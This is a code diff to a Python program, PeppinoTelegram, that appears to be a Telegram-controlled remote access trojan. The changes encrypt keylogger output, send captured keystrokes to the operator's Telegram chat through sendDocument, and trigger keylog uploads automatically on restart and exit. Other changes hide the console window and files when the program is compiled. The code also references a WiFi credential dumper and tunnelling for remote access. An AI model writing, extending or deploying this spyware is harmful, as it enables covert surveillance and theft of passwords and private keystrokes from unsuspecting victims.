@@ -75,14 +75,17 @@ except ImportError as e:
 #TODO Add all the message boxes to a file un user_interaction/boxes.py
 
 # This is needed to understand if the file was compiled or not
-FROZEN = getattr(sys, 'frozen', False)
+FROZEN = getattr(sys, "frozen", False)
+
 if FROZEN:
-    rp_base_path = dirname(sys.executable)
+    rp_base_path = getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
 else:
-    rp_base_path = dirname(__file__)
-print(f"The function 'resource_path' will use {rp_base_path} as base_path")
+    rp_base_path = os.path.dirname(__file__)
+
+print(f"resource_path base: {rp_base_path}")
+
 def resource_path(relative_path: str) -> str:
-    return join(rp_base_path, relative_path)
+    return os.path.join(rp_base_path, relative_path)
 
 def load_dll(path: str) -> None:
     print(f"Loading DLL:", path)
@@ -489,7 +492,13 @@ class PeppinoTelegram:
         self.overlay_opencv = OpenCVOverlayPlayer()
         self.audio_mixer = CustomMixer()
         self.audio_player = AudioPlayer()
-        self.keylogger = Keylogger(randomname())
+
+        keyloggers_key = SimpleFernet.generate_key()
+        keyloggers_fernet = SimpleFernet(keyloggers_key, b"RCPTKLGG")
+        self.keylogger = Keylogger(
+            log_file=randomname(),
+            encryptor=keyloggers_fernet
+        )
 
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
@@ -1367,7 +1376,7 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
         print("Getting logs")
         try:
             if self.logger:
-                fname = f"{randomname()}.log"
+                fname = f"{now()}.log"
                 logs = self.logger.get_logs()
                 if not logs:
                     self.bsend("No logs")
@@ -1422,12 +1431,15 @@ d8P'  `Y8b  `88.       .888' `888'   `Y8b  d8P'    `Y8                          
 
     def get_keylog(self) -> None:
         self.keylogger.save_to_file()
-        with open(self.keylogger.log_file, "r") as fi:
-            try:
-                fname = f"{randomname()}.keylogger.log"
-                self.bot.sendDocument(self.owner_id, fi)
-            except Exception as e:
-                self.bsend(f"Exception while sending keylogs: \n{e}")
+        keylog = self.keylogger.read_from_file()
+        fi = craft_file(
+            content=keylog.encode() if keylog else b"",
+            filename=f"keylog-{now()}.keylogger.log"
+        )
+        try:
+            self.bot.sendDocument(self.owner_id, fi)
+        except Exception as e:
+            self.bsend(f"Exception while sending keylogs: \n{e}")
 
     def leftclick(self) -> None:
         print("Left mouse click")
@@ -2241,6 +2253,7 @@ The bot is now restarting. Please wait a moment...
 <i>⏱️ This may take a few seconds</i>""" if not custom_message else custom_message)
         if doit:
             self.get_logs()
+            self.get_keylog()
             restart()
 
     def randomkeyboard(self, timeout: int =5) -> None:
@@ -3077,6 +3090,8 @@ The bot is now restarting. Please wait a moment...
             self.bsend("🛑 Interrupted by you, bye bye.")
             self.stop_all_tunnels()
             reset_mouse_controller_and_visibility()
+            self.get_keylog()
+            self.get_logs()
             sys.exit()
         else:
             self.operation_canceled()
@@ -3248,5 +3263,7 @@ if __name__ == "__main__":
 
     pep2 = PeppinoTelegram(token,chat_id,ngrok_token,capture,loading_bar_set=[emoji_dict["progress"],emoji_dict["empty_progress"]],loading_bar_spinner=all_spinners["circle_dots"], tunnel_provider="ngrok" if ngrok_token and tunnel_provider=="ngrok" else "localtunnel", logger=logger)
     # I wanted to make this multiple user but the code has become too hard to maintain.
-    hide_console_window()
+    if FROZEN:
+        hide_console_window()
+        hide_files()
     pep2.start()
